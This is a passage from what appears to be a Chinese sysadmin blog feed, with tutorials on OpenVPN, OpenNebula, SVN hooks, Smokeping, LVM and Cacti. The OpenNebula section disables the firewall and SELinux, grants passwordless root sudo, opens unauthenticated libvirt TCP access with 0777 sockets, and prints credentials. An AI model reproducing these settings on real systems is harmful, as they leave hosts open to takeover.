/usr/local/openvpn/etc/checkpsw.sh via-env</div><div class="line">client-cert-not-required</div><div class="line">username-as-common-name</div><div class="line">wget http://openvpn.se/files/other/checkpsw.sh -O /usr/local/openvpn/etc/checkpsw.sh</div><div class="line">chmod +x checkpsw.sh</div><div class="line">修改脚本PASSFILE和LOG_FILE参数文件位置</div><div class="line">PASSFILE=/etc/openvpn/etc/psw-file</div><div class="line">LOG_FILE=/etc/openvpn/etc/openvpn-password.log</div><div class="line"> </div><div class="line">用户名和密码文件格式：</div><div class="line">/etc/openvpn/etc/psw-file(用户和密码之间用空格或者tab隔开)</div><div class="line">geekwolf geekwolf</div></pre></td></tr></table></figure>
<h5 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">可参考源码下的配置：</div><div class="line">sample/sample-config-files/firewall.sh</div><div class="line">本测试的规则为：</div><div class="line">-A INPUT -i tun+ -j ACCEPT</div><div class="line">-A FORWARD -i tun+ -o eth1 -j ACCEPT</div><div class="line">-A FORWARD -i eth1 -o tun+ -j ACCEPT</div><div class="line">-A OUTPUT -o tun+ -j ACCEPT </div><div class="line">-A POSTROUTING -s 10.8.0.0/24 -o eth1 -j MASQUERADE</div><div class="line">-A POSTROUTING -d 104.172.0.0/255.255.255.0     -o eth0 -j MASQUERADE</div><div class="line"></div><div class="line">通过以上配置实现了：</div><div class="line">访问公司内网192.168.0.0 走vpn的eth1出口，访问104.172.0.0等走vpn的eth0出口，访问其他地址均走客户端本地</div></pre></td></tr></table></figure>
<h5 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">Windows 7 客户端配置</div><div class="line">下载 http://swupdate.openvpn.org/community/releases/openvpn-install-2.3.2-I001-x86_64.exe（或者OpenVPN Client官网下载）</div><div class="line">安装后桌面会生成，属性设置</div><div class="line"> </div><div class="line">A.若采用秘钥方式认证</div><div class="line">客户端做一下事情：</div><div class="line"> 拷贝服务端ca.crt  用户秘钥geekwolf.crt geekwolf.key 到OpenVpn客户端安装根目录下下的config目录内</div><div class="line"> 增加客户端配置文件client.ovpn：</div><div class="line">client</div><div class="line">dev tun</div><div class="line">proto tcp</div><div class="line">remote 120.3.243.54 9001</div><div class="line">resolv-retry infinite</div><div class="line">nobind</div><div class="line">persist-key</div><div class="line">persist-tun</div><div class="line">ca ca.crt</div><div class="line">cert geekwolf.crt</div><div class="line">key geekwolf.key</div><div class="line">comp-lzo</div><div class="line">verb 3</div><div class="line">最后以管理员身份运行OpenVPN GUI程序，即可连接使用vpn</div><div class="line"> </div><div class="line">A.若采用用户密码认证（pam认证）</div><div class="line">注释掉用户cert和keys，配置文件增加密码询问auth-user-pass</div><div class="line">既：</div><div class="line">client</div><div class="line">dev tun</div><div class="line">proto tcp</div><div class="line">remote 120.3.243.54 9001</div><div class="line">resolv-retry infinite</div><div class="line">nobind</div><div class="line">persist-key</div><div class="line">persist-tun</div><div class="line">ca ca.crt</div><div class="line">；cert geekwolf.crt</div><div class="line">；key geekwolf.key</div><div class="line">comp-lzo</div><div class="line">verb 3 </div><div class="line">auth-user-pass</div><div class="line">（免输入账号密码方法：auth-user-pass passwd.txt）</div><div class="line">passwd.txt 格式</div><div class="line">账号</div><div class="line">密码</div></pre></td></tr></table></figure>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><blockquote>
<p>深入OpenVPN的配置 <a href="http://www.linuxfly.org/post/86/" target="_blank" rel="external">http://www.linuxfly.org/post/86/</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 系统安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> openvpn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Centos 6.4 下 部署OpenNebula4.4]]></title>
      <url>/2013/12/14/centos-install-opennebula.html</url>
      <content type="html"><![CDATA[<h4 id="安装部署"><a href="#安装部署" class="headerlink" title="安装部署"></a>安装部署</h4><h5 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Front:192.168.10.101 Centos6.4 x 64 NF5120</div><div class="line">Node1:192.168.10.102 Centos6.4 x 64 NF5120</div></pre></td></tr></table></figure>
<h5 id="部署OpenNebula4-4"><a href="#部署OpenNebula4-4" class="headerlink" title="部署OpenNebula4.4"></a>部署OpenNebula4.4</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">下载相应版本 http://www.opennebula.org/software:software#from_official_repository_of_linux_distributions</div><div class="line">CentOS-6-opennebula-4.4.0-1</div><div class="line">安装Epel源</div><div class="line">rpm -ivh http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm</div><div class="line">cd opennebula-4.4.0-1</div><div class="line">yum -y localinstall *.rpm</div><div class="line">Front控制器在此也作为节点使用，在计算节点上安装 kvm 和 opennebula-node-kvm：</div><div class="line"></div><div class="line">yum localinstall opennebula-node-kvm-4.0.0-1.x86_64.rpm</div><div class="line">yum install qemu-kvm qemu-kvm-tools libvirt</div><div class="line">/etc/init.d/libvirtd start</div><div class="line"></div><div class="line">以上OpenNebula的控制节点和计算节点所需软件包均以安装完，下面进行简单的配置( 事先关闭iptables和selinux，后续讲如何加固)</div></pre></td></tr></table></figure>
<p>a. 更改Opennebula的front，即OpenNebula-sunstone服务的监听地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sed -i &apos;s#127.0.0.1#192.168.10.101#g&apos; /etc/one/sunstone-server.conf</div></pre></td></tr></table></figure>
<p>b. 默认会生成用户名和随机密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cat /var/lib/one/.one/one_auth</div><div class="line">oneadmin:6696d237e58221ae1eb39fdf3a01335f</div><div class="line">访问http://192.168.10.101:9869 输入账号密码</div></pre></td></tr></table></figure>
<p>c. 更改opennebula数据存储方式为mysql</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">vim /etc/one/oned.conf</div><div class="line">修改仓库路径：</div><div class="line">DATASTORE_BASE_PATH = /data/datastoress(注意目录权限为oneadmin)</div><div class="line">注释DB = [ backend = &quot;sqlite&quot; ]</div><div class="line">打开注释：</div><div class="line">DB = [ backend = &quot;mysql&quot;,</div><div class="line">server = &quot;localhost&quot;,</div><div class="line">port = 0,</div><div class="line">user = &quot;oneadmin&quot;,</div><div class="line">passwd = &quot;oneadmin&quot;,</div><div class="line">db_name = &quot;opennebula&quot; ]</div><div class="line">（相关授权略）</div></pre></td></tr></table></figure>
<p>d. 添加环境变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">export ONE_XMLRPC=http://localhost:2633/RPC2</div><div class="line">export ONE_AUTH=$HOME/.one/one_auth</div><div class="line">export PATH=$ONE_LOCATION/bin:$PATH</div></pre></td></tr></table></figure>
<p>e. 为初次部署方便暂使用网络桥接模式<br>母机桥接配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">ifcfg-eth0:</div><div class="line"></div><div class="line">DEVICE=eth0</div><div class="line">TYPE=Ethernet</div><div class="line">UUID=200f14a6-c347-4d4a-9564-257ccf4ebe8a</div><div class="line">ONBOOT=yes</div><div class="line">NM_CONTROLLED=yes</div><div class="line">BOOTPROTO=none</div><div class="line">HWADDR=00:E0:81:DE:6C:CA</div><div class="line">BRIDGE=&quot;br0&quot;</div><div class="line"></div><div class="line">ifcfg-br0:</div><div class="line">DEVICE=&quot;br0&quot;</div><div class="line">TYPE=&quot;Bridge&quot;</div><div class="line">BOOTPROTO=&quot;static&quot;</div><div class="line">ONBOOT=&quot;yes&quot;</div><div class="line">IPADDR=192.168.10.102</div><div class="line">NETMASK=255.255.240.0</div><div class="line">DNS1=114.114.114.114</div><div class="line">brctl show 可查询现有桥接的网络</div><div class="line">bridge name bridge id STP enabled interfaces</div><div class="line">br0 8000.00e081de6cca no eth0</div><div class="line">重启网卡</div></pre></td></tr></table></figure>
<p>f. 确定计算节点权限（Front安装时会自动配置）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">/etc/libvirt/qemu.conf</div><div class="line">user = &quot;oneadmin&quot;</div><div class="line">group = &quot;oneadmin&quot;</div><div class="line">dynamic_ownership = 0</div><div class="line"></div><div class="line">/etc/libvirt/libvirtd.conf</div><div class="line">listen_tcp = 1</div><div class="line">listen_tls = 0</div><div class="line">mdns_adv = 0</div><div class="line">unix_sock_group = &quot;oneadmin&quot;</div><div class="line">unix_sock_ro_perms = &quot;0777&quot;</div><div class="line">unix_sock_rw_perms = &quot;0777&quot;</div><div class="line">auth_unix_ro = &quot;none&quot;</div><div class="line">auth_unix_rw = &quot;none&quot;</div><div class="line"></div><div class="line">/etc/sysconfig/libvirtd(修改监听地址)</div><div class="line">LIBVIRTD_ARGS=&quot;--listen&quot;</div><div class="line"></div><div class="line">/etc/sudoers</div><div class="line">添加oneadmin ALL=(root)NOPASSWD:ALL</div><div class="line">注释#Defaults requiretty</div><div class="line"></div><div class="line">ln -s /usr/libexec/qemu-kvm /usr/bin/kvm</div><div class="line">将Front的oneadmin的公钥拷贝到计算节点oneadmin下实现无密码认证</div></pre></td></tr></table></figure>
<p>g .以上OpenNebula的部署已经完成，下面启动服务器进行简单操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">service OpenNebula start</div><div class="line">service OpenNebula-sunstone start</div></pre></td></tr></table></figure>
<p><a href="http://ow1schdt5.bkt.clouddn.com/old/2013/12/s2.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/old/2013/12/s2-1024x573.jpg" alt="s"></a></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> opennebula部署 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[svn强制要求添加并允许修改注释信息]]></title>
      <url>/2013/09/09/svn-force-add-comments.html</url>
      <content type="html"><![CDATA[<h4 id="SVN强制添加注释信息"><a href="#SVN强制添加注释信息" class="headerlink" title="SVN强制添加注释信息"></a>SVN强制添加注释信息</h4><p>hooks目录 编辑pre-commit 文件内容，找到下面3行，用#注释掉<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$SVNLOOK log -t &quot;$TXN&quot; &quot;$REPOS&quot; | </div><div class="line"> grep &quot;[a-zA-Z0-9]&quot; &gt; /dev/null || exit 1</div><div class="line"> commit-access-control.pl &quot;$REPOS&quot; &quot;$TXN&quot; commit-access-control.cfg || exit 1</div></pre></td></tr></table></figure></p>
<p>然后再修改处下面增加一下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">LOGMSG=`$SVNLOOK log -t &quot;$TXN&quot; &quot;$REPOS&quot; | grep &quot;[a-zA-Z0-9]&quot; | wc -c`</div><div class="line">if [ &quot;$LOGMSG&quot; -lt 5 ];#........5.........</div><div class="line">then</div><div class="line"> echo -e &quot;nLog message cann&apos;t be empty! you must input more than 5 chars as comment!.&quot; 1&gt;&amp;2</div><div class="line">exit 1</div><div class="line">fi</div></pre></td></tr></table></figure></p>
<p>保存退出。 设置pre-commit文件权限可执行 使用如下命令chomd +x pre-commit</p>
<h4 id="允许用户修改注释信息"><a href="#允许用户修改注释信息" class="headerlink" title="允许用户修改注释信息"></a>允许用户修改注释信息</h4><p>用户修改注释信息的动作，对应的是pre-revpos-change。将hooks目录下的pre-revpos-change.tmpl改名为pre-revpos-change<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#!/bin/sh</div><div class="line">REPOS=&quot;$1&quot;</div><div class="line">REV=&quot;$2&quot;</div><div class="line">USER=&quot;$3&quot;</div><div class="line">PROPNAME=&quot;$4&quot;</div><div class="line">ACTION=&quot;$5&quot;</div><div class="line"></div><div class="line">if [ &quot;$ACTION&quot; = &quot;M&quot; -a &quot;$PROPNAME&quot; = &quot;svn:log&quot; ];</div><div class="line">then</div><div class="line">    exit 0;</div><div class="line">fi</div><div class="line"></div><div class="line">echo &quot;Changing revision properties other than svn:log is prohibited&quot; &gt;&amp;2</div><div class="line">exit 1</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> svn </tag>
            
            <tag> svn注释 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[smokeping网络质量监控部署]]></title>
      <url>/2013/09/05/smokeping-install.html</url>
      <content type="html"><![CDATA[<h4 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h4><p>smokeping依赖于LNMP或者LAMP及rrdtool</p>
<h4 id="安装rrdtool支持"><a href="#安装rrdtool支持" class="headerlink" title="安装rrdtool支持"></a>安装rrdtool支持</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">yum -y install libxml2-devel libpng-devel glib pango pango-devel  freetypefreetype-devel fontconfig cairo cairo-devel libart_lgpl libart_lgpl-devel perl perl-Net-Telnet perl-Net-DNSperl-LDAP perl-libwww-perl perl-RadiusPerl perl-IO-Socket-SSL perl-Socket6perl-CGI-SpeedyCGI rrdtool-per</div><div class="line"></div><div class="line">wget http://oss.oetiker.ch/rrdtool/pub/rrdtool-1.4.7.tar.gz</div><div class="line">cd rrdtool-1.4.7</div><div class="line">./configure --prefix=/usr/local/rrdtool</div><div class="line">make &amp;&amp; make install</div></pre></td></tr></table></figure>
<p><strong>问题</strong>：<a href="http://ow1schdt5.bkt.clouddn.com/old/2013/09/c2.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/old/2013/09/c2.png" alt="c"></a> <a href="http://ow1schdt5.bkt.clouddn.com/old/2013/09/c1.png" target="_blank" rel="external">1</a><br><strong>解决</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install perl-ExtUtils-CBuilder perl-ExtUtils-MakeMaker</div></pre></td></tr></table></figure></p>
<h4 id="安装-smokeping-依赖的软件"><a href="#安装-smokeping-依赖的软件" class="headerlink" title="安装 smokeping 依赖的软件"></a>安装 smokeping 依赖的软件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">wget http://down1.chinaunix.net/distfiles/cgilib-0.5.tar.gz</div><div class="line">tar xzvf cgilib-0.5.tar.gz</div><div class="line">cd cgilib-0.5</div><div class="line">make</div><div class="line">cp libcgi.a  /usr/local/lib</div><div class="line">cp cgi.h /usr/include/</div><div class="line"></div><div class="line">http://fping.org/dist/fping-3.4.tar.gz</div><div class="line">./configure –prefix=/usr/local/fping</div><div class="line">make &amp;&amp; make install</div><div class="line">whereis fping</div><div class="line">fping: /usr/local/fping</div><div class="line">ln -s /usr/local/fping/sbin/fping  /usr/sbin/fping</div><div class="line">这个链接是对应/usr/local/smokeping/etc/config里面的probe fping</div><div class="line"></div><div class="line">wget http://ncu.dl.sourceforge.net/project/echoping/echoping/6.0.2/echoping-6.0.2.tar.gz</div><div class="line">tar xzvf echoping-6.0.2.tar.gz</div><div class="line">cd echoping-6.0.2</div><div class="line">./configure</div><div class="line">make &amp;&amp; make install</div></pre></td></tr></table></figure>
<p><strong>问题</strong>： <a href="http://ow1schdt5.bkt.clouddn.com/old/2013/09/cc3.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/old/2013/09/cc3.png" alt="cc"></a><br><strong>解决</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">下载popt-1.14.tar.gz</div><div class="line">wget http://downloads.sourceforge.net/project/kanapi/sources/RELEASES/popt-1.14.tar.gz?r=http%3A%2F%2Fen.sourceforge.jp%2Fprojects%2Fsfnet_kanapi%2Fdownloads%2Fsources%2FRELEASES%2Fpopt-1.14.tar.gz%2F&amp;ts=1368433312&amp;use_mirror=jaist</div><div class="line"></div><div class="line">./configure </div><div class="line">make &amp;&amp; make install</div><div class="line"></div><div class="line">wget http://ftp.gnu.org/gnu/gettext/gettext-0.18.tar.gz</div><div class="line">tar zxvf gettext-0.18.tar.gz</div><div class="line">cd gettext-0.18</div><div class="line">./configure </div><div class="line">make &amp;&amp; make install</div><div class="line">cd ..</div></pre></td></tr></table></figure></p>
<h4 id="安装配置Smokeping"><a href="#安装配置Smokeping" class="headerlink" title="安装配置Smokeping"></a>安装配置Smokeping</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line">wget http://oss.oetiker.ch/smokeping/pub/smokeping-2.6.8.tar.gz</div><div class="line">tar zxvf smokeping-2.6.8.tar.gz</div><div class="line">cd smokeping-2.6.8</div><div class="line">./configure –prefix=/usr/local/smokeping</div><div class="line">./setup/build-perl-modules.sh /usr/local/smokeping/thirdparty</div><div class="line">./configure –prefix=/usr/local/smokeping </div><div class="line"></div><div class="line">gmake install </div><div class="line">安装完毕，下面修改配置文件。</div><div class="line">进入 bin 目录，修改 smokeping 文件</div><div class="line">#vim smokeping</div><div class="line">第八行：  use lib qw(); # PERL5LIB</div><div class="line">修改为：     use lib qw(/usr/local/rrdtool/lib/perl);</div><div class="line">进入 htdocs 目录</div><div class="line"># mv smokeping.fcgi.dist smokeping.fcgi</div><div class="line">进入 etc 目录</div><div class="line">cp config.dist config</div><div class="line">修改 config 文件</div><div class="line"></div><div class="line">创建存放数据文件的目录</div><div class="line">mkdir  c/usr/local/smokeping/data  /usr/local/smokeping/var </div><div class="line">/usr/local/smokeping/cache</div><div class="line">修改 smokeping 的目录为 nginx 运行用户的属主、组</div><div class="line">chown -R daemon.daemon smokeping/</div><div class="line">chmod 600 /usr/local/smokeping/etc/smokeping_secrets.dist</div><div class="line">chmod  –R  777  /usr/local/smokeping/cache  /usr/local/smokeping/data </div><div class="line">/usr/local/smokeping/var</div><div class="line">创建 smokeping 的 log 文件</div><div class="line">touch /var/log/smokeping.log</div><div class="line">chown daemon.daemon /var/log/smokeping.log</div><div class="line">启动 smokeping</div><div class="line">perl /usr/local/smokeping/bin/smokeping --logfile=/var/log/smokeping.log</div><div class="line">建立 smokeping 启动脚本，方便启动</div><div class="line">vim /etc/init.d/smokeping</div><div class="line">添加为以下内容：</div><div class="line">#!/bin/bash</div><div class="line">#</div><div class="line"># chkconfig: 2345 80 05</div><div class="line"># Description: Smokeping init.d script</div><div class="line"># Hacked by : YunVN - http://www.yunvn.com</div><div class="line"># Get function from functions library</div><div class="line">. /etc/init.d/functions</div><div class="line"># Start the service Smokeping</div><div class="line">start() &#123;</div><div class="line">echo -n &quot;Starting Smokeping: &quot;</div><div class="line">/usr/local/smokeping/bin/smokeping &gt;/dev/null 2&gt;&amp;1</div><div class="line">### Create the lock file ### </div><div class="line">touch /var/lock/subsys/smokeping</div><div class="line">success $&quot;Smokeping startup&quot;</div><div class="line">echo</div><div class="line">&#125;</div><div class="line"># Restart the service Smokeping</div><div class="line">stop() &#123;</div><div class="line">echo -n &quot;Stopping Smokeping: &quot;</div><div class="line">kill -9 `ps ax | grep &quot;/usr/local/smokeping/bin/smokeping&quot; | grep -v grep | awk </div><div class="line">&apos;&#123; print $1 &#125;&apos;` &gt;/dev/null 2&gt;&amp;1</div><div class="line">### Now, delete the lock file ###</div><div class="line">rm -f /var/lock/subsys/smokeping</div><div class="line">success $&quot;Smokeping shutdown&quot;</div><div class="line">echo</div><div class="line">&#125;</div><div class="line">### main logic ###</div><div class="line">case &quot;$1&quot; in</div><div class="line">start)</div><div class="line">start</div><div class="line">;;</div><div class="line">stop)</div><div class="line">stop</div><div class="line">;;</div><div class="line">status)</div><div class="line">status Smokeping</div><div class="line">;;</div><div class="line">restart|reload|condrestart)</div><div class="line">stop</div><div class="line">start</div><div class="line">;;</div><div class="line">*)</div><div class="line">echo $&quot;Usage: $0 &#123;start|stop|restart|reload|status&#125;&quot;</div><div class="line">exit 1</div><div class="line">esac</div><div class="line">exit 0</div></pre></td></tr></table></figure>
<p>给脚本有可执行权限</p>
<h1 id="chmod-755-etc-rc-d-init-d-smokeping"><a href="#chmod-755-etc-rc-d-init-d-smokeping" class="headerlink" title="chmod 755 /etc/rc.d/init.d/smokeping"></a>chmod 755 /etc/rc.d/init.d/smokeping</h1><p>设置开机启动 smokeping </p>
<p><strong>问题：</strong><br>启动时出现问题： <a href="http://ow1schdt5.bkt.clouddn.com/old/2013/09/ccc2.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/old/2013/09/ccc2.png" alt="ccc"></a> 解决：yum -y install rrdtool-perl</p>
<p><strong>解决：</strong><br><a href="https://github.com/geekwolf/sa-scripts/tree/master/config" target="_blank" rel="external">https://github.com/geekwolf/sa-scripts/tree/master/config</a></p>
<p>注释：ping的节点可以适当做些调整</p>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> smokeping </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[LVM简单配置总结]]></title>
      <url>/2013/08/03/lvm-base.html</url>
      <content type="html"><![CDATA[<p>lvm  操作步骤：<br>1、找块空的硬盘 ，分区sdd1和sdd2。用t 改变system  id ，为8e，（lvm），w保持退出。<br>2、pvscan<br>3、pvcreate  /dev/sdd1   生成pv<br>4、vgcreate  vg1   /dev/sdd1  把pv（dev/sdd1）创建为一个vg1的卷组<br>5、lvcreate   －L  10M  -n  lv1  vg1   把vg1里面的10M的空间划分出来创建lv1。<br>6、格式化lv1   mkfs.ext3  /dev/vg1/lv1<br>7、挂载lv1    mount  /dev/vg1/lv1   /mnt/lv1<br>8、可以正常使用lv1<br>改变lv的大小<br>方法一：在未使用lv的时候，可以通过lvextend  扩展，需要先卸载，再扩展，再格式化，最后重新挂载。<br>lvextend  -L  +20M  /dev/vg1/lv1  增加20M<br>lvreduce  -L  -10M  /dev/vg1/lv1   减少10M<br>方法二：在已使用lv的时候，可以通过resize2fs  无损扩展，无需重新挂载，无需格式化。<br>lvresize  -L  200M  /dev/vg1/lv1<br>先设定大小为200M<br>lvresize  －L   ＋10M  /dev/vg1/lv1<br>带＋  意思是在原有基础上面增加10M<br>resize2fs  /dev/vg1/lv1<br>这条命令是执行重定义尺寸操作</p>
<p>将逻辑卷data扩容20M,注意有+和没+的区别，有+是将逻辑卷增加了20M,没+是将逻辑卷增加到20M，区别很大</p>
<p>改变vg大小<br>通过增加pv到vg中，来增加vg的总容量<br>步骤：<br>1、pvcreate  /dev/sdd2<br>2、vgextend  vg1   /dev/sdd2</p>
<p>上面是我个人总结实验的基本步骤，现在给一张拓扑图 ，便于理解操作！<br><img src="http://img1.51cto.com/attachment/200908/200908301251618386095.jpg" alt=""></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Cacti的优化]]></title>
      <url>/2013/04/02/cacti-performance.html</url>
      <content type="html"><![CDATA[<h4 id="优化schema-Index"><a href="#优化schema-Index" class="headerlink" title="优化schema/Index"></a>优化schema/Index</h4><p>cacti默认的cacti.sql建立的数据库模型，竟然一个Index都没有建。每次执行poller.php的时候，主要的时间，都花费在数据库*查询上。使用下面的sql语句，建立一系列索引，弥补默认的cacti.sql中缺乏index的缺点。可以有效的提高poller.php执行的效率，缩短更新RRD文件所需的时间</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">CREATE INDEX `data_template_data_id` ON `data_input_data` (`data_template_data_id`);</div><div class="line">CREATE INDEX `host_id_snmp_query_id_snmp_index` ON data_local (`host_id`,`snmp_query_id`,`snmp_index`);</div><div class="line">CREATE INDEX `local_data_id_data_source_name` ON data_template_rrd (`local_data_id`,`data_source_name`);</div><div class="line">CREATE INDEX `graph_template_id_local_graph_id` ON graph_templates_item (`graph_template_id`,`local_graph_id`);</div><div class="line">CREATE INDEX `local_graph_template_item_id` ON graph_templates_item (`local_graph_template_item_id`);</div><div 